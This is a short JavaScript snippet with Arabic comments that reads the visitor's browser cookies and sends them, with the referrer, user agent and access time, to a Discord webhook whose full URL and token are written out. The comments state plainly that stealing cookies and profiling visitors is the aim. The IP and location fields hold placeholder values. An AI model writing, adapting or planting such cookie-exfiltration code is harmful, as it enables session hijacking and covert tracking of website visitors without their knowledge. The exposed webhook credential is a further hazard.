// إنشاء السكربت لقراءة الكوكيز وإرسالها إلى Webhook
const script = document.createElement('script'); 
script.textContent = `
    console.log('Current Cookies:', document.cookie);

    document.cookie = "username=JohnDoe; path=/; expires=Fri, 31 Dec 2024 23:59:59 GMT";

    console.log('Updated Cookies:', document.cookie);
`;
document.body.appendChild(script);  // تصحيح الخطأ في appendChild

// إرسال الكوكيز إلى Webhook ديسكورد
fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: `Cookies: ${document.cookie}`
    })
});

// إرسال تفاصيل الزائر إلى Webhook (باستخدام Discord Embed)
const ip = '192.168.1.1';  // مثال على عنوان IP
const ipInfoData = {
    country: 'CountryName',
    city: 'CityName',
    region: 'RegionName'
};  // بيانات IP مفترضة
const referrer = document.referrer || "N/A";
const userAgent = navigator.userAgent;
const dateTime = new Date().toLocaleString();  // تاريخ ووقت الدخول

fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: "**New visitor information**",  // العنوان الأساسي
        embeds: [
            {
                title: "Visitor Details",  // عنوان الرسالة في Discord
                fields: [
                    { name: "IP Address", value: ip, inline: true },  // عرض عنوان الـ IP
                    { name: "Country", value: ipInfoData.country, inline: true }, // عرض الدولة
                    { name: "City", value: ipInfoData.city || "Unknown", inline: true }, // عرض المدينة
                    { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, // عرض المنطقة
                    { name: "Referrer", value: referrer, inline: false },  // رابط الإحالة
                    { name: "User Agent", value: userAgent, inline: false }, // معلومات المتصفح
                    { name: "Date & Time", value: dateTime, inline: false }  // تاريخ ووقت الدخول
                ]
            }
        ]
    })
});
